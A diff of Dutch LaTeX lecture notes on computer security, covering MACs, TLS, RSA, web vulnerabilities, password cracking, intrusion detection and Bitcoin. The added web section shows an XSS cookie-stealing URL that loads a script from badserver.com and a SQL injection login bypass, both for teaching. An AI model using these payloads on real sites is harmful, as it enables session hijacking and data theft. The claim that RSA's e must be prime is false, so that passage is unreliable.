@@ -125,10 +125,15 @@
 	\begin{itemize}
 		\item Indien $M$ en $C_k(M)$ gekend zijn, moet het onmogelijk zijn om een bericht $M'$ te construeren zodat \textbf{$$C_k(M') = C_k(M)$$} Dit is nodig voor data-integriteit
 		
-		\item De waarden die $C_k(M)$ kan aannemen met gelijk verspreidt worden over alle mogelijke waarden van de MAC. De kans dat twee berichten $M$ en $M'$ dezelfde MAC krijgen moet $\frac{1}{2^n}$ zijn.
+		\item De waarden die $C_k(M)$ kan aannemen moet gelijk verspreidt worden over alle mogelijke waarden van de MAC. De kans dat twee berichten $M$ en $M'$ dezelfde MAC krijgen moet $\frac{1}{2^n}$ zijn.
 	\end{itemize}
-
-De ideale MAC is enkel kwetsbaar voor brute force aanvallen. 
+	Hoe dat een MAC een bericht authenticeerd, is te zien op figuur \ref{fig:mac_werking}, met $K$ de gedeelde sleutel en het MACalgoritme een op voorhand afgesproken algoritme om de MAC te berekenen.
+	\begin{figure}[ht]
+		\centering
+		\includegraphics[width=\textwidth]{mac_werking}
+		\caption{Authenticatie met behulp van een MAC.}
+		\label{fig:mac_werking}
+	\end{figure}
 
 	\end{itemize}
 
@@ -597,7 +602,7 @@ De ideale MAC is enkel kwetsbaar voor brute force aanvallen.
 		\item Lengte van de informatie.
 	\end{itemize}
 
-	\item De \underline{\textbf{master secret}}, die nodig is bij een TLS sessie, wordt ofwel gegenereerd door de cliënt met RSA encryptie en verzonden naar de server, ofwel uitgewisseld met Diffie-Helman. De grootte van de sleutel bedraagt 384 bits. Sleutels kunnen niet hergebruikt worden aangezien ze afhankelijk zijn van de nonces die gebruikt werden tijdens het handshake protocol.
+	\item De \underline{\textbf{master secret}}, die nodig is bij een TLS sessie, wordt ofwel gegenereerd door de cliënt, geëncrypteerd met RSA en verzonden naar de server, ofwel uitgewisseld met Diffie-Helman. De grootte van de sleutel bedraagt 384 bits. Sleutels kunnen niet hergebruikt worden aangezien ze afhankelijk zijn van de nonces die gebruikt werden tijdens het handshake protocol.
 	\item Het \underline{\textbf{Heartbeat protocol}} draait bovenop het record protocol en heeft voornamelijk als doel om huidige connecties te testen, en om ze in leven te houden zonder dat er opnieuw moet onderhandeld worden tussen de cliënt en de server. Het protocol ondersteund twee berichten:
 		\begin{itemize}
 			\item \textbf{HeartbeatRequest}: De cliënt of server verstuurt naar de ander een bericht met daarin een payload (typisch een string) en de lengte van de payload. 
@@ -962,9 +967,11 @@ De ideale MAC is enkel kwetsbaar voor brute force aanvallen.
 
 	\section{Asymmetrische algoritmen}
 	\subsection{RSA}
-	\textbf{Rivest-Shamir-Adleman (RSA)} is een asymmetrisch encryptiealgoritme waarbij de sleutelgrootte typisch \textbf{512, 1024, 2048 of 4096} bits bedraagt. Het encryptie- en decryptieproces voeren dezelfde wiskundige operaties uit. De veiligheid van het algoritme ligt aan het feit dat het ontbinden in factoren van het product van 2 priemgetallen $p$ en $q$ moeilijk is. De sleutel genereren begint van twee priemgetallen $p$ en $q$, waarvan het product $n = p\cdot q$ wordt berekend. De priemgetallen $p$ en $q$ zijn \textbf{privaat}, het getal $n$ is \textbf{publiek}. Op $n$ wordt de Eulers totiënt functie losgelaten. Aangezien dat $p$ en $q$ beiden priemgetallen zijn is dit eenvoudig: $$\phi(n) = (p - 1) \cdot (q - 1)$$ \accentuate{($\phi(n)$ geeft het aantal getallen terug in het bereik $[1, n]$ die relatief priem (grootst gemene deler = 1) zijn ten opzichte van $n$. Bij een priemgetal zal elk positief getal, kleiner dan het priemgetal, de grootst gemene deler altijd 1 zijn)}
+	\textbf{Rivest-Shamir-Adleman (RSA)} is een asymmetrisch encryptiealgoritme waarbij de sleutelgrootte typisch \textbf{512, 1024, 2048 of 4096} bits bedraagt. Het encryptie- en decryptieproces voeren dezelfde wiskundige operaties uit. De veiligheid van het algoritme ligt aan het feit dat het ontbinden in factoren van het product van 2 priemgetallen $p$ en $q$ moeilijk is. De sleutel genereren begint met twee priemgetallen $p$ en $q$, waarvan het product $n = p\cdot q$ wordt berekend. De priemgetallen $p$ en $q$ zijn \textbf{privaat}, het getal $n$ is \textbf{publiek}. Op $n$ wordt de Eulers totiënt functie losgelaten. Aangezien dat $p$ en $q$ beiden priemgetallen zijn is dit eenvoudig: $$\phi(n) = (p - 1) \cdot (q - 1)$$ \accentuate{($\phi(n)$ geeft het aantal getallen terug in het bereik $[1, n]$ die relatief priem (grootst gemene deler = 1) zijn ten opzichte van $n$. Bij een priemgetal zal elk positief getal, kleiner dan het priemgetal, de grootst gemene deler altijd 1 zijn)}
 	
-	De berekende waarde $\phi(n)$ is \textbf{privaat}. Verder wordt een getal $e$, dat ook \textbf{publiek} is, gekozen zodat $$gcd(\phi(n), e) = 1 \;\hbox{en}\; 1 < e < \phi(n)$$ Tot slot wordt een getal $d$, dat \textbf{privaat} is berekend als: 
+	De berekende waarde $\phi(n)$ is \textbf{privaat}. Verder wordt een getal $e$, dat ook \textbf{publiek} is, gekozen zodat $$gcd(\phi(n), e) = 1 \;\hbox{en}\; 1 < e < \phi(n)$$
+	Dit wil dus zeggen dat $e$ ook een priemgetal moet zijn. Vaak wordt $e = 65537 = 2^{16} + 1$ gekozen, omdat hier maar $2$ bits aanstaan zodat encryptie/decryptie sneller is.
+	Tot slot wordt $d$ gelijkgesteld aan het multiplicatieve inverse van $e$ module $\phi(n)$.
 	$$d = e^{-1} \mod \phi(n)$$
 
 	De publieke sleutel bestaat dan uit $e$ en $n$: $KU=\langle e, n \rangle$
@@ -1175,17 +1182,84 @@ De ideale MAC is enkel kwetsbaar voor brute force aanvallen.
 	\end{enumerate}
 
 	\subsection{Webapplicaties}
-	Mogelijke zwaktes in een webapplicatie:
+	\subsubsection{Kwetsbaarheden}
 	\begin{itemize}
 		\item[\info] \textbf{Slechte configuratie}: Gebruik maken van oude software, paswoorden die makkelijk te raden zijn, source code die gedownload kan worden.
 		\item[\info] \textbf{Client-side}: De client-side vertrouwen is een slechte zaak. Het is eenvoudig om met javascript manipulaties uit te voeren. Controleer elke actie op de server-side.
 		\item[\info] \textbf{Direct object reference}: De applicatie bevat resources die enkel mogen gezien worden voor een geautoriseerde gebruiker, maar iedereen kan eigenlijk gewoon de URL intypen.
 		\item[\info] \textbf{Authenticatiefouten}: Het gebruik van zwakke paswoorden, die gekraakt kunnen worden met een brute-force methode. Ook als een gebruiker een fout paswoord, maar wel een juist username intypt, moet de applicatie toch tonen dat het ofwel een fout paswoord of fout usernaam is.
-		\item[\info] \textbf{Cross-site scripting (XSS)}: \todo{slide 64}
+		\item[\info] \textbf{Cross-site scripting (XSS)}: XSS werkt goed bij zwakke webservers. Een aanvaller kan code injecteren, zodat normale gebruikers die code zullen uitvoeren wanneer ze de zwakke webserver bezoeken. \underline{X voorbeelden:}
+		\begin{enumerate}
+			\item Een webserver laat toe om queries in te geven. Gebruikers kunnen inloggen met hun username en paswoord. Er wordt een cookie bijgehouden die de sessie bijhoudt. Bij een foute query, zoals 
+			$$\texttt{http://web.org?q=puppies}$$ zal de webserver een foutmelding geven:
+			$$\texttt{Error - puppies not found}$$
+			Een aanvaller probeert nu na te gaan of deze webserver gevoelig is aan XSS aanvallen. Hij verandert de query:
+			$$\texttt{http://web.org?q=<script type='text/javascript'>alert('xss');</script>}$$
+			Na uitvoering van deze query, verschijnt er een popup op het venster met 'xss', alsook een melding:
+			$$\texttt{Error - <script type='text/javascript'>alert('xss');</script> not found}$$
+			De aanvaller weet nu dat hij een XSS aanval kan uitvoeren. De query valideert de input namelijk niet, zodat er eender wat kan staan. De aanvaller construeert een URL, waarbij de query een script is dat de cookies van de ingelogde gebruiker ophaalt en doorstuurt naar de aanvaller zijn server, zoals:
+			$$\texttt{http://web.org?q=<script src="http://badserver.com/script.js"></script>}$$
+			De aanvaller verstuurt deze (gemaskeerde) URL naar gebruikers. Elke gebruiker die daar nu op klikt, zal dat script uitvoeren op zijn browser. Als de administrator van de webserver op deze link klikt, krijgt de aanvaller toegang tot dit adminaccount.
+
+			\begin{itemize}
+				\item[\info] De server kan dit voorkomen door input te valideren, ongeldige queries te redirecten, meerdere logins op hetzelfde accounts invalideren.
+				\item[\info] De client kan dit enkel voorkomen door op de hoogte te zijn van zulke aanvallen, en niet op vreemde links te klikken van onbekenden.
+			\end{itemize}
+			\item Een forum laat toe om nieuwe posts te maken en hierop te reageren. Een reactie wordt ingegeven in een bepaald inputveld. Een aanvaller merkt nu op dat dit inputveld ook HTML tags kan bevatten, met als gevolg dat er ook scripts kunnen uitgevoerd worden. Een aanvaller kan nu hetzelfde script gebruiken om cookies te stelen van vorig scenario. Elke gebruiker die nu naar de pagina surft waar die reactie staat, zal dat script uitvoeren op zijn browser, met als gevolg dat de aanvaller de sessies kan hijacken. Gebruikers hebben hier zelfs geen weet van dat dit op de achtergrond aan het draaien is.
+			\begin{itemize}
+				\item[\info] Het forum moet, als het HTML tags toelaat, de script tags uit de reactie halen.
+			\end{itemize}
+			\item 
+		\end{enumerate}
+
+		XSS kan onder andere gebruikt worden voor: cookie stealing, website redirection, phishing, privacy violation, javascript malware, ...
+		\item[\info] \textbf{SQL Injection}: Een bepaalde HTTP request kan iets opvragen uit een databank. Stel dat we willen inloggen, dan versturen we een username en paswoord (wordt nooit gedaan via een query string, maar maakt het voorbeeld iets eenvoudiger. Het paswoord wordt geëncrypteerd via TLS):
+		$$\texttt{POST /login?u=foo\&p=bar}$$
+		De gebruiker ophalen in een SQL databank:
+		$$\texttt{SELECT * FROM users WHERE username = 'foo'}$$
+		De aanvaller kan proberen om de \texttt{WHERE} clausule te omzeilen, door eigen SQL code te injecteren:
+		$$\texttt{POST /login?u='+OR+1<2\#\&p=bar}$$
+		De SQL code ziet er nu zo uit:
+		$$\texttt{SELECT * FROM users WHERE u = '' OR 1 < 2\#}$$
+		Het \# symbool zorgt ervoor dat alles erna als comentaar beschouwd wordt. Deze uitspraak is natuurlijk altijd waar, zodat alle gebruikers teruggestuurd worden naar de aanvaller.
+		
+		\item[\info] \textbf{Cross-site request forgery (CSRF)}:
+	\end{itemize}
+	\subsubsection{Verdedigmogelijkheden}
+	Er bestaan meerdere manieren om een webserver te beschermen:
+	\begin{itemize}
+		\item[\info] Risicoanalyse.
+		\item[\info] Security training personeel.
+		\item[\info] Code review.
+		\item[\info] Testing.
+	\end{itemize}
+	De meer technische details:
+	\begin{itemize}
+		\item[\info] Alle input valideren. Maak hiervoor gebruik van een whitelist van gekende en betrouwbare waarden. Een blacklist is moeilijk om juist te krijgen, omdat er dan kennis nodig is over elke mogelijke waarde ooit. Voor SQL kan je gebruik maken van prepared statements, zodat het statement opgeslagen wordt in de databank zelf.
 	\end{itemize}
 	\section{Veilige systemen}
 	\subsection{Authenticatiemethoden}
-	...
+	\subsubsection{Paswoorden}
+	Een paswoord kan voor praktisch alles gebruikt worden. De meest gebruikte applicaties zijn: inloggen op een computer, inloggen op een website, PIN code voor betaalkaarten, enz. Een paswoord wordt typisch niet in plaintext opgeslagen, maar wordt gehashed. Op die manier zijn paswoorden niet verloren wanneer de databank in de handen van een aanvaller komt. Het voordeel van een paswoord is dat het een 
+	\begin{itemize}
+		\item[\good] eenvoudig mechanisme is en,
+		\item[\good] genoeg veiligheid biedt voor meeste applicaties. 
+	\end{itemize}
+	Er zijn ook nadelen aan verbonden:
+	\begin{itemize}
+		\item[\alert] Het wordt afgeraden om éénzelfde paswoord te gebruiken voor meerdere applicaties. Anderzijds is het moeilijk om elk verschillend paswoord te onthouden.
+		\item[\alert] Makkelijk te raden paswoorden worden nog te vaak gebruikt.
+	\end{itemize}
+	Paswoorden kraken is dan ook een belangrijk topic, aangezien een paswoord tot veel informatie kan leiden. Er zijn meerdere redenen om een paswoord te kraken. Soms kan het zijn dat je een eigen paswoord vergeten bent, en dat je deze terug wilt. Het kan ook handig zijn om de veiligheid van paswoorden na te gaan in een bedrijf door deze te kraken. De laatste categorie is natuurlijk de slechtste, paswoorden kraken om gevoelige informatie te bemachtigen. Een paswoord kraken kan op verschillende manieren:
+	\begin{itemize} 
+		\item[\info] \textbf{Brute force attack:} Een brute force aanval is zelden bruikbaar. Elke permutatie van bits uitproberen is enkel nuttig bij een klein aantal bits. Er bestaan wel methoden om de snelheid van een brute force aanval te verbeteren. Het gebruik van een GPU kan de snelheid met een factor 50 tot 100 vergroten. Ook kunnen computers geparalleliseerd werken.
+		\item[\info] \textbf{Dictionary attack:} Deze methode maakt gebruik van een voorgedefinieerde lijst van vaak gebruikte paswoorden. Er kan een trade-off gemaakt worden tussen het gebruik van berekende hashes voor die paswoorden en de tijd die men daarin wil steken. Varianten van deze aanval zal de lijst uitbreiden met kleine wijzigingen voor elk paswoord.
+		\item[\info] \textbf{Hash chaining:} Een hash chain is een opeenvolging van hash- en reductiefuncties:
+		$$aaaaaa \rightarrow_{\substack{H}} 281DAZF40 \rightarrow_{\substack{R}}  sgfnyd \rightarrow_{\substack{H}}  920ECF10 \rightarrow_{\substack{R}}  kiebgt$$
+		Enkel het eerste en het laatste paswoord worden opgeslaan, als een paar $aaaaaa \rightarrow kiebgt$. Stel nu dat we een hash $920ECF10$ hebben, als we hier de reductiefunctie op loslaten krijgen we $kiebgt$.  In onze tabel zoeken we op of er een bepaalde hash chain eindigt op $kiebgt$, in dit geval start deze chain met $aaaaaa$. We voeren dezelfde bewerking uit en zo zal blijken dat het paswoord $sgfnyd$ is. In praktijk wordt er een lijst bijgehouden van vaak gebruike paswoorden samen met hun hash chain. De reductiefunctie kiezen is moeilijk, omdat ze moet resulteren in waarschijnlijke paswoorden. Een ander nadeel is dat erveel valse alarmen zijn. Dit wil zeggen dat een andere chain dezelfde hash uitkomt. \todo{slide16}
+	\end{itemize}
+	\subsubsection{Biometrieken}
+	\subsubsection{Security tokens}
 	\subsection{Vertrouwd besturingssysteem}
 
 	\begin{table}[ht]
@@ -1302,7 +1376,7 @@ De ideale MAC is enkel kwetsbaar voor brute force aanvallen.
 	\begin{table}[ht]
 		\begin{tabular}{l c l}
 			\underline{Attack detection} & vs & \underline{Intrustion detection} \\
-			De IDS hoort \emph{buiten} de beveiligingsomgeving. & & De IDS hoort \emph{binnen} de beveiligingsomgeving. \\
+			De IDS staat \emph{buiten} de beveiligingsomgeving. & & De IDS staat \emph{binnen} de beveiligingsomgeving. \\
 			Genereert veel overbodige alerts & & Detecteert interne hacking.
 		\end{tabular}
 	\end{table}
@@ -1318,7 +1392,7 @@ De ideale MAC is enkel kwetsbaar voor brute force aanvallen.
 	\section{Audit records}
 	= bevat logs over de handelingen die gebruikers uitvoeren op het interne netwerk. Elke log bevat een user ID om de juiste gebruiker te traceren.
 
-	Er kan gebruikt gemaakt worden van de \underline{naïeve, door het besturingssysteem ondersteunde} loggingsysteem. Dit heeft als voordeel dat er geen extra componenten moeten geïnstalleerd worden, maar het grote nadeel is dat de structuur van de logberichten meestal niet aan de gewenste vorm voldoen. Men gebruikt een \underline{speciaal, op maat gemaakt systeem}, die enkel nuttige informatie (probe points) bijhoudt voor het IDS en ook nog systeemonafhankelijk is. 
+	Er kan gebruikt gemaakt worden van de \underline{native, door het besturingssysteem ondersteunde} loggingsysteem. Dit heeft als voordeel dat er geen extra componenten moeten geïnstalleerd worden, maar het grote nadeel is dat de structuur van de logberichten meestal niet aan de gewenste vorm voldoen. Men gebruikt een \underline{speciaal, op maat gemaakt systeem}, die enkel nuttige informatie (probe points) bijhoudt voor het IDS en ook nog systeemonafhankelijk is. 
 
 	Voorbeelden van \underline{nuttige informatie in een audit record} is:
 	\begin{itemize}
@@ -1352,6 +1426,76 @@ De ideale MAC is enkel kwetsbaar voor brute force aanvallen.
 
 	\end{itemize}
 
+	\section{Praktische benaderingen}
+	\begin{itemize}
+		\item[\info] \textbf{Statistische benadering:} Proberen om normaal gedrag te definieren, zodat een afwijking op dit gedrag gezien wordt als een aanval.
+
+		Om normaal gedrag te definieren, moet er eerst genoeg audit logs zijn. Er zijn hier \underline{drie methoden}:
+		\begin{enumerate}
+			\item \textbf{Treshold detection:} Een bepaalde actie gedurende een interval kan een bepaald aantal keer voorkomen. Grote afwijkingen van dit aantal geeft aanleiding tot een aanval. 
+			\item \textbf{Profile based:} Voor elke gebruiker kan een profiel gemaakt worden, die zijn typische acties beschrijft. Van alle profielen tesamen kan een gemiddeld profiel gemaakt worden, die dan gebruikt wordt als de definitie van normaal gedrag.
+			\item \textbf{Anomaly detection:} Automatisch analyseren van het netwerk. Er worden statistische en heuristische maatregelen genomen bij events, en bepalen of deze matchen bij het normaal model. Dit model kan opgebouwd worden uit statistische berekeningen, neurale netwerken en state change analyse. Het voordeel van deze methode is dat het alle aanvallen kan herkennen, en dat het automatisch zal aanpassen.
+		\end{enumerate}
+		\item[\info] \textbf{Rolgebaseerde benadering:} Proberen om abnormaal gedrag te definieren. Op die manier kunnen welgekende aanvallen direct gedetecteerd worden.
+
+		Ook hier zijn er \underline{twee methoden}:
+		\begin{enumerate}
+			\item \textbf{Misuse detection:} Bij deze methode wordt er gespecificeerd wat een aanval is. De audit logs worden gecontroleerd op basis van de regels zoals: 
+			\begin{itemize}
+				\item Gebruikers mogen geen bestanden lezen van een andere gebruiker.
+				\item Gebruikers mogen geen systeembestanden kopiëren.
+				\item Ping flooding, IP Frag attack, ...
+			\end{itemize}
+
+			Deze methode heeft veel weg van een antivirussysteem, die ook werkt met regels, die constant up to date moeten zijn, maar gemakkelijk te misleiden zijn. Het is wel eenvoudig te implementeren.
+			\item \textbf{Burglar alarms:} 
+		\end{enumerate}
+
+	\end{itemize}
+
+	\chapter{Future evolutions}
+	\section{Cryptocurrency en blockchains}
+	\begin{itemize}
+		\item[\info] \textbf{Virtuele currency:} virtueel geld dat binnen een bepaalde virtuele wereld gebruikt kan worden: facebook credits, MMORPG geld, ...
+		\item[\info] \textbf{Cryptocurrency:} Maakt gebruik van cryptografische methoden om enerzijds veilige transacties uit te voeren en anderzijds nieuwe currency te genereren. Typisch is dit een gedecentraliseerd systeem.
+		\item[\info] Elke virtuele currency moet volgende \underline{uitdagingen} aangaan:
+		\begin{itemize}
+			\item Hoe wordt het aangemaakt.
+			\item Hoe wordt inflatie voorkomen (Hoe voorkom je dat er één iemand is die heel veel coins kan maken?)
+			\item Zijn de geproduceerde coins geldig? (proof-of-work)
+			\item Hoe voorkom je dat één bepaalde coin meerdere malen gebruikt kan worden (bv zelfde briefje van $5$ euro tweemaal gebruiken zodat je $10$ euro hebt.) 
+		\end{itemize}
+		\item[\info] Elke virtuele currency moet ook aan bepaalde \underline{security eisen} voldoen:
+		\begin{itemize}
+			\item[\info] \textbf{Authenticatie:} Nagaan of de juiste persoon betaald wordt, en dat de uitbetaalde waarde geldig is.
+			\item[\info] \textbf{Integriteit:} Voorkomen dat een coin tweemaal gebruikt wordt tijdens een transactie. Het omkeren van transacties moet ook onmogelijk zijn.
+			\item[\info] \textbf{Beschikbaarheid:} Kan een transactie op eender welk moment uitgevoerd worden?
+		\end{itemize}
+	\end{itemize}
+
+	\underline{Bitcoin is cryptocurrency}
+	\begin{itemize}
+		\item[\info] Totaal aantal bitcoins is 21 miljoen.
+		\item[\info] Maakt gebruik van een proof-of-work systeem. Dit wil zeggen dat elke coin een bepaalde identificatie krijgt, die een koper moet tonen aan de verkoper. Bitcoin gebruikt hiervoor cryptografische hashes.
+		\item[\info] Geen centrale bank.
+		\item[\info] Een gebruiker die een \underline{transactie} uitvoerd, moet eerst een digitale handtekening gebaseerd op de vorige transactie, en de nieuwe eigenaar zijn publieke sleutel, toevoegen aan het einde van de coins die gespendeerd zullen worden. Op die manier kan iedereen de geschiedenis van een bepaalde coin nagaan.
+	\end{itemize}
+
+	\underline{Blockchain is een verzameling van transacties}
+	\begin{itemize}
+		\item[\info] Een block is een verzameling van transacties. Elke block bevat ook een cryptografische relatie naar het vorige block.
+		\item[\info] Blokken zijn aan elkaar gelinkt (cfr. gelinkte lijst) door middel van een proof-of-work berekening, die vaak bestaat uit een hashfunctie met een moeilijk te vinden nonce. De verificatie is eenvoudig, maar de proof-of-work niet.
+		\item[\info] De proof-of-work werkt als volgt: zoek een nonce zodat H(vorige hash, nonce, T) $<$ E, met T de lijst van transacties van het block en E een moeilijkheidsvariabele, gespecificeerd door het netwerk. Deze E wordt automatisch aangepast zodat een niew block om de 10 minuten gevonden kan worden.
+	\end{itemize}
+
+	\underline{Elke node op een bitcoin netwerk maakt deel uit van het volgende algoritme}
+	\begin{itemize}
+		\item[\info] Een nieuwe transactie wordt gebroadcast naar alle nodes.
+		\item[\info] Elke node verzamelt deze transacties in een block.
+		\item[\info] Elke node werkt de proof-of-work uit voor zijn block.
+		\item[\info] De node die het eerst klaar is, broadcast het block naar alle nodes.
+		\item[\info] Elke node controleert of dat alle transacties in dat block geldig zijn. Minimum 50\% van de beschikbare nodes moeten akkoord gaan.
+	\end{itemize}
 
 
 \end{document}
